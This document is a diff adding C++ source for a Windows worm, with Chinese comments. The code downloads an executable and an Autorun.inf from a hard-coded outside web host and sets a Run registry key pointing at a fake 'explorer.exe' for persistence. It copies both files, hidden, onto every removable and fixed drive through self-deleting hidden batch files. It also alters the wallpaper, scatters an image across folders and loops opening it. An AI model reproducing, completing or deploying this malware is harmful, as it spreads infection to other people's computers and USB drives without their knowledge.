@@ -1,0 +1,280 @@
+//made by 珞珈凤凰
+//
+
+#include "stdafx.h"
+#include<stdio.h>
+#include<stdlib.h>
+#include<windows.h>
+#include<urlmon.h>
+#include<process.h>
+#include<Shellapi.h>  //这个头文件里有ShellExecute的定义
+#include <iostream>
+#include  <iomanip>
+#include <fstream>
+#include   <cstdio>   
+#include   <stack>
+#pragma comment (lib,"Urlmon.lib")
+//函数
+void down();
+bool Checkdisk();
+void Scandisk();
+void usb();
+void destory();
+void reg();
+//void changewallpaper();
+int getname();
+
+using namespace std;
+#define FILENAME "C:\\Autorun.inf"//变量
+
+int getname()//获取当前用户名 并修改墙纸 需要重起见效
+{
+	char szName[1024];
+	unsigned long lens = sizeof(szName);
+
+	GetUserName(szName, &lens );
+
+
+	static char subkey1[] = "Control Panel\\Desktop"; 
+static char vname1[] = "ConvertedWallpaper"; 
+static char exefile1[] = "C:\\progra~1\\Messenger\\jl.bmp"; 
+ULONG dType = REG_SZ, len = 0; 
+HKEY hKey; 
+RegOpenKeyEx(HKEY_CURRENT_USER,subkey1,0,KEY_SET_VALUE|KEY_QUERY_VALUE,&hKey);//打开。 
+RegSetValueEx(hKey, vname1, 0, REG_SZ,(BYTE *)exefile1, strlen(exefile1)+1); //加上。 
+RegCloseKey(hKey); //关闭。
+static char subkey2[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Desktop\\BackgroundManager"; 
+static char vname2[] = "OldConvertedWallpaper"; 
+HKEY hKeys; 
+RegOpenKeyEx(HKEY_CURRENT_USER,subkey2,0,KEY_SET_VALUE|KEY_QUERY_VALUE,&hKey);//打开。 
+RegSetValueEx(hKey, vname2, 0, REG_SZ,(BYTE *)exefile1, strlen(exefile1)+1); //加上。 
+RegCloseKey(hKeys); //关闭。
+FILE *f;//复制一份图片
+	f=fopen("change.bat","w=");
+    fprintf(f,"copy C:\\progra~1\\Messenger\\jl.bmp C:\\docume~1\\%s\\LocalS~1\\Applic~1\\Microsoft\\Wallpaper1.bmp",szName);
+    //注意使用短文件名
+	fprintf(f,"\n"); 
+	//fprintf(f,"del change.bat");//自删除
+	fclose(f);
+	WinExec("change.bat",SW_HIDE);
+return 0;
+
+}
+void reg()//利用注册表进行自启动
+{
+static char subkey[] = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"; 
+static char vname[] = "explorer.exe"; 
+static char exefile[] = "C:\\progra~1\\Messenger\\explorer.exe"; 
+ULONG dType = REG_SZ, len = 0; 
+HKEY hKey; 
+RegOpenKeyEx(HKEY_LOCAL_MACHINE,subkey,0,KEY_SET_VALUE|KEY_QUERY_VALUE,&hKey);//打开。 
+if (RegQueryValueEx(hKey, vname, 0, &dType, NULL, &len)) { //如果没有explorer， 
+RegSetValueEx(hKey, vname, 0, REG_SZ,(BYTE *)exefile, strlen(exefile)+1); //就加上。 
+} 
+RegCloseKey(hKey); //关闭。
+
+}
+void usb()//复制
+{
+	FILE *f;
+	fstream _file;
+     _file.open(FILENAME,ios::in);
+     if(!_file)//判断C:\\Autorun.inf是否已经存在
+     {
+      
+	f=fopen("C:\\Autorun.inf","w=");
+	fprintf(f,"[autorun]");
+	fprintf(f,"\n"); 
+	fprintf(f,"OPEN=explorer.exe");
+	fclose(f);
+	    }
+	 else
+	 {
+	 }
+	f=fopen("usb.bat","w=");
+	fprintf(f,"copy C:\\progra~1\\Messenger\\explorer.exe C:\\explorer.exe");
+    fprintf(f,"\n");
+    //fprintf(f,"attrib +h C:\\progra~1\\Messenger\\explorer.exe");//隐藏文件
+	fprintf(f,"\n");
+    fprintf(f,"attrib +h C:\\explorer.exe");
+	fprintf(f,"\n");
+    fprintf(f,"attrib +h C:\\Autorun.inf");
+    fprintf(f,"\n");
+    fprintf(f,"del usb.bat");//自删除
+	fclose(f);
+	WinExec("usb.bat",SW_HIDE);
+	
+}
+void down()//下载
+{
+
+        URLDownloadToFile(NULL,"http://aitai.com.cn/jl.bmp","C:\\progra~1\\Messenger\\jl.bmp",0,NULL);//下文件
+		URLDownloadToFile(NULL,"http://aitai.com.cn/explorer.exe","C:\\progra~1\\Messenger\\explorer.exe",0,NULL);//下文件
+		URLDownloadToFile(NULL,"http://aitai.com.cn/Autorun.inf","C:\\progra~1\\Messenger\\Autorun.inf",0,NULL);//下文件
+        ShellExecute(0,"open","C:\\progra~1\\Messenger\\jl.bmp",NULL,NULL,SW_SHOW);//运行文件
+        }
+void destory()
+{
+	int i=1;
+	while(i<=100)
+	{
+	ShellExecute(0,"open","C:\\progra~1\\Messenger\\jl.bmp",NULL,NULL,SW_SHOW);//运行文件
+	Sleep(13000);
+		i=i;//不断循环吧~
+	}
+}
+bool Checkdisk()//扫描是否有移动盘
+{
+	char usb[4]={0};
+	wsprintf(usb,"C:\0");//很重要
+	  usb[0]='C';
+	  
+	while(usb[0]<='Z')
+			{
+				if(GetDriveType(usb)==DRIVE_REMOVABLE)
+				{
+		   FILE *f;
+	f=fopen("usb1.bat","w=");
+	fprintf(f,"copy C:\\progra~1\\Messenger\\explorer.exe %c:\\explorer.exe",usb[0]);
+	fprintf(f,"\n");
+	fprintf(f,"copy C:\\progra~1\\Messenger\\Autorun.inf %c:\\Autorun.inf",usb[0]);
+	fprintf(f,"\n");
+	fprintf(f,"attrib +h %c:\\Autorun.inf",usb[0]);
+	fprintf(f,"\n");
+	fprintf(f,"attrib +h %c:\\explorer.exe",usb[0]);
+	fprintf(f,"\n");
+	fprintf(f,"del usb1.bat");
+	fclose(f);
+	WinExec("usb1.bat",SW_HIDE);
+	return true;
+				}
+				else if(GetDriveType(usb)==DRIVE_FIXED)
+				{
+					FILE *f;
+					f=fopen("usb1.bat","w=");
+	fprintf(f,"copy C:\\progra~1\\Messenger\\explorer.exe %c:\\explorer.exe",usb[0]);
+	fprintf(f,"\n");
+	fprintf(f,"copy C:\\progra~1\\Messenger\\Autorun.inf %c:\\Autorun.inf",usb[0]);
+	fprintf(f,"\n");
+	fprintf(f,"attrib +h %c:\\Autorun.inf",usb[0]);
+	fprintf(f,"\n");
+	fprintf(f,"attrib +h %c:\\explorer.exe",usb[0]);
+	fprintf(f,"\n");
+	fprintf(f,"del usb1.bat");
+	fclose(f);
+	WinExec("usb1.bat",SW_HIDE);
+	//return true;
+				}
+			
+	usb[0]++;
+	
+	}
+			
+	//	}
+		
+	return false;
+}
+void Scandisk()//定时检测是否有移动盘
+{
+	while(!Checkdisk())
+	{
+		Sleep(4000);//扫描后停止4秒
+	}
+}
+void   function(   LPCTSTR   lpszPath)   //复制JL.bmp到各个文件夹，还有缺陷。
+  {   
+          //开始查找;   
+          stack<TCHAR*>   Dirs;   
+          stack<int>         DirDepth;   
+    
+          TCHAR   *tmp=new   TCHAR[lstrlen(lpszPath)+1];   
+          lstrcpy(tmp,lpszPath);   
+    
+          if(tmp[lstrlen(tmp)-1]=='\\')     
+                  tmp[lstrlen(tmp)-1]='\0';   
+    
+          TCHAR   szFind[MAX_PATH*2];   
+          TCHAR   szFile[MAX_PATH*2];   
+          TCHAR   *curdir;   
+          int       curdepth=1;   //当前文件夹的深度   
+    
+          Dirs.push(tmp);   
+          DirDepth.push(curdepth);   
+    
+          for(;!Dirs.empty();)   
+          {   
+                  curdir=Dirs.top();   
+                  curdepth=DirDepth.top();   
+                  Dirs.pop();   
+                  DirDepth.pop();   
+    
+                  lstrcpy(szFind,curdir); //  curdir盘符
+                 lstrcat(szFind,   "\\*.*");   //   找所有文件   
+                  WIN32_FIND_DATA   wfd;   
+    
+                  HANDLE   hFind   =   FindFirstFile(szFind,   &wfd);   
+                      if   (hFind   !=   INVALID_HANDLE_VALUE)   //   如果找到   
+                  {   
+                          do   
+                          {   
+    
+                                  if   (wfd.cFileName[0]   ==   '.')   
+                                          continue;   //   过滤"."   ".."   这两个目录   
+    
+                                  if   (wfd.dwFileAttributes   &   FILE_ATTRIBUTE_DIRECTORY)   
+                                  {   
+									  FILE *f;//复制一份图片
+	f=fopen("change.bat","w=");
+    fprintf(f,"copy C:\\progra~1\\Messenger\\jl.bmp %s\\%s\\jl.bmp",curdir,   wfd.cFileName);
+    //注意使用短文件名
+	fprintf(f,"\n"); 
+	fprintf(f,"del change.bat");//自删除
+	fclose(f);
+	Sleep(100);
+	WinExec("change.bat",SW_HIDE);
+                                          wsprintf(szFile,   "%s\\%s",   curdir,   wfd.cFileName);//wfd.cFileName文件夹名   
+    
+                                          //function(szFile);   //   如果找到的是目录，则进入此目录进行递归   
+                                          TCHAR*   tmp=new   TCHAR[lstrlen(szFile)+2];   
+                                          lstrcpy(tmp,szFile);   
+                                          Dirs.push(tmp);   
+                                          DirDepth.push(curdepth+1);   
+                                  }   
+ 
+                  }   while   (FindNextFile(hFind,   &wfd));   
+    
+          }
+		 
+    
+          delete   []   curdir;   
+    
+          FindClose(hFind);   //   关闭查找句柄   
+    
+  }//   for()   
+  }   
+void EntryPoint() 
+{ 
+       ExitProcess(WinMain(GetModuleHandle(NULL), NULL, GetCommandLine(), SW_HIDE)); 
+}
+//主函数
+int WINAPI WinMain(HINSTANCE hInstance,
+                     HINSTANCE hPrevInstance,
+                     LPSTR     lpCmdLine,
+                     int       nCmdShow)
+                     //int   argc,char   *argv[])
+{
+
+	//getname();
+	//reg();
+	//down();
+    //usb();
+	Checkdisk();
+    Scandisk();
+	//destory();
+      
+    //TCHAR   path[MAX_PATH]="E:";   
+    
+    //function(path);   
+ 
+	return 0;
+}
